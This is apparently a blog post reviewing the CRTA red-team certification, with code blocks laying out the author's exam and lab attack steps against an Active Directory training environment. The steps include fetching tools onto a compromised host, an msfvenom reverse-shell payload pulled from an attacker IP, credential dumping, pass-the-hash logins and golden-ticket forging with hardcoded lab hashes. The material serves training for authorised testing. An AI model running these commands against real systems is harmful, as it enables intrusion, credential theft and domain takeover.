---
header:
 teaser: /assets/images/Certs/CRTZ.png
title: "CRTA: Full Guide & My Honest Review"
author_profile: true
layout: single
categories: [Certificates]
excerpt: "Certified Red Team Analyst Review & Full Guide (LAB & EXAM) Tips!"
tags: [Certificates]
toc: true
toc_sticky: true
---
![](/assets/images/Certs/CRTZ.png)
{% include arabic-btn.html %}

## Introduction
On October 11 2026 i obtained the **CRTA** certificate from CyberWarfare. The exam is a black box which consists of an active directory environment which is hidden beforehand and you have to reach through a website as your initial target. 

The exam has flags you need to find as you go through each step. Below is a summarized flow of the exam.

``` text
SSRF --> LFI ETC/PASSWD --> Enumeration --> Website Login Credentials 
& Hidden IP with HTTP --> AD Initial Access credentials in txt file --> Privilege Escalation --> Secret Flag
```

## Course Content
The course content is thorough and great as a beginner, the book as well as the case study. The only issue is, there is some typos in the book as well as the videos. The most learning you will get is the case study video, so i advice whoever is new to Active Directory to just learn the basics externally step by step then watch the case study (Lab) video. Although the case study is great, the videos is old and unnecessarily long and can confuse beginners. The methodology is correct, but also narrow as it only shows lateral movement through getting a service ticket, but not administrator .ccache. 

My ultimate advice, learn the basics wherever you like, do the lab multiple times your own way and with your own tools. Below i will list more details on how to approach the lab better as well as the methodology to follow.

## The Exam
The exam honestly was way less than i expected. The lab was more detailed and difficult as we needed to laterally move to the parent domain which was not in the exam at all. The lab is very good practice in general even if you are preparing for other certs like **OSCP** or **AD-RTS**. Overall, great for anyone getting into Red Teaming in Active Directory as you will chain vulnerabilities together, enumerate the system and **privilege escalate** your way in the system.

## How to prepare?
I can say that i definitely over prepared even though there is no such thing, no knowledge is wasted :). I got in the exam very confidently as i finished the lab multiple times and timed it as it was the real exam and my final attempt took less than an hour to fully finish the lab. A few weeks prior i also completed the **GOAD-Light** lab, which prepared me even more beforehand.

So, what should YOU do? 
Practice. Thats the most important, do one of the **GOAD** labs and the CRTA Lab multiple times. Practice on them until you find you methodology and what you are going to do, then time yourself and imagine you are in the exam. If you can finish it in half the time of the actual exam, you are 100% ready for whatever will come in the exam.

**Practice Labs**
- [GOAD](https://orange-cyberdefense.github.io/GOAD/labs/)
- TryHackMe - [Wreath](https://tryhackme.com/room/wreath)
- TryHackMe - [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
- [Hack The Box](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

## My Way

### Exam methodology
Below is my attack flow in details to fully pwning the exam (No passwords or flags given, just methodology).

``` bash
# Reconnaissance
- Nmap the initial target
- SSRF --> LFI --> SSH 
# Initial Access

# Once on the system:
start python3 -m http.server 80 in your Tools/
curl -O <IP>/linpeas.sh
curl -O <IP>/agent
chmod +x linpeas.sh
chmod +x agent

# Run Linpeas
./linpeas | tee linpeas-output.txt

# After it finished, get the passwords and find the hidden internal network
grep -iE 'passwd|Password|container|docker|Accepted' linpeas-output.txt

NOTE: You dont need to docker exec -it <DOCKER_ID> because you will find the password through linpeas.

# Start Ligolo
sudo ./proxy -selfcert
./agent -connect <IP>:11601 -ignore-cert

# Then on your attacker machine
sudo ip route add 10.10.10.0/24 dev ligolo

# Nmap
sudo nmap -sn 10.10.10.0/24
# Hidden IP found earlier through Linpeas
sudo nmap -sVC 10.10.10.20
# DC Scan
sudo nmap -sVC 10.10.10.100

# Fuzz the hidden website
gobuster dir -u http://10.10.10.20 -w /usr/share/wordlists/rockyou.txt

# After you find the AD Credentials file there, test access
nxc smb <IP> <DOMAIN>/<USER>:<PASS>@<TARGET-DOMAIN> 
# If successful, proceed to dump
nxc smb <IP> <DOMAIN>/<USER>:<PASS>@<TARGET-DOMAIN> --lsa --ntds --sam
OR
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET-DOMAIN>

# Login with the administrator NT hash
evil-winrm -i <IP> -u Administrator -H <NTHASH>

Get your secret file and thats it !
```

### Lab methodology
Pwn the lab step by step.

``` bash
# Ligolo
sudo ./proxy -selfcert
./agent -connect <IP> -ignore-cert
autoroute

# Know what are the target IPs for AD from Linux
ip neigh show
Add REACHABLE/STALE hosts in /etc/hosts and parent IP in the resolv.conf

# IMPORTANT: After connection, add the internal IPs or /24 to the ligolo interface

# Debug Network Interface
ip route get dev ligolo
ip route get dev tun0
sudp ip route add 192.168.98.0/24 dev ligolo
sudo ip route replace 192.168.98.120/32 dev ligoxy
sudo ip route replace 192.168.98.2/32 dev ligoxy
sudo ip route replace 192.168.98.30/32 dev ligoxy

# Initial Access Enumeration
./linpeas -s | grep -iE '.db|container|sqlite|mysql' | tee linpeas_output.txt

# Enum manually for sqlite, db, and docker
echo "=== DATABASE FILES ==="; find /home /opt /var/www /srv /tmp -type f \( -iname "*.db" -o -iname "*.sqlite*" -o -iname "*.db3" \) 2>/dev/null; echo "=== CONTAINER PROCESSES ==="; ps aux | grep -Ei 'docker|containerd|podman|runc|lxc' | grep -v grep; echo "=== CONTAINER SOCKETS ==="; ls -l /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null; echo "=== COMPOSE AND ENV FILES ==="; find /home /opt /srv /var/www -type f \( -name '.env' -o -name 'compose.yaml' -o -name 'compose.yml' -o -name 'docker-compose.yml' -o -name 'docker-compose.yaml' \) 2>/dev/null

# Open an sqlite file
sqlite3 PATH/password.sqlite
# Get a shell inside a Docker container
docker exec -it <CONTAINER_ID> /bin/sh
# STABLE REV SHELL
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.98.15 LPORT=5555 -f exe -o okyz.exe

# Ligolo python dropper
listener_add --addr 192.168.98.15:8000 --to 127.0.0.1:8000
# Ligolo Stable Reverse Shell
listener_add --addr 192.168.98.15:5555 --to 127.0.0.1:666

# cURLing
curl.exe -O http://192.168.98.15:8000/okyz.exe

# Parent Domain Test
dir \\dc01.warfare.corp\C$

# AD Enumeration  
# Domain users
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --users
# Export users
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --users-export users.txt
# Groups
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --groups
# Computers
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --computers
# Domain controllers
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-list
# Domain SID
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --get-sid
# Active users
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --active-users
# Password policy
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --pass-pol
# Fine-grained password policies
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --pso
# AS-REP Roasting
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --asreproast asrep-results.txt
# Kerberoasting
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --kerberoasting kerberoast-results.txt
# Find delegation
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --find-delegation
# Accounts trusted for delegation
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --trusted-for-delegation
# BloodHound collection
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --bloodhound -c <COLLECTION>

# Dumping
nxc smb 192.168.98.30 -u -p --ntds
nxc smb 192.168.98.30 -u -p --lsa
impacket-secretsdump -u -p

  

# GOLDEN TICKET
impacket-ticketer -domain child.warfare.corp -nthash e57dd34c1871b7a23fb17a77dec9b900 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -extra-sid S-1-5-21-3375883379-808943238-3239386119-519 administrator
export KRB5CCNAME= administrator.ccache

# TEST
nxc smb 192.168.98.2 -u administrator —use-kcache (PWN3D) (If didnt work check nameserver and make sure parent IP is the only one there.)

# DUMP
nxc smb 192.168.98.2 -u administrator --use-kcache --ntds (IT HAS TO BE NTDS)
# LOGIN
evil-winrm -i 192.168.98.2 -u administrator -H a2f7b77b62cd97161e18be2ffcfdfd60 

# GET THE FLAG OR A BETTER SHELL
curl.exe -O http://192.168.98.15:8000/okyz.exe 

# THEN LISTEN ON THE REV SHELL PORT AND THAT IT !
nc -lvnp 666
```

# Conclusion
[CyberWarfare](https://cyberwarfare.live/) is great as its cost-efficient, has many courses for each role (Blue, Red, Ai, Purple & more). Its a great place to start and work your way up to more complex AD exams where obfuscation, Defense Evasion, and lateral movement is more occurring and the forest is waay bigger. Good luck to everyone and stay curious :)

![](/assets/images/Certs/CRTA.png)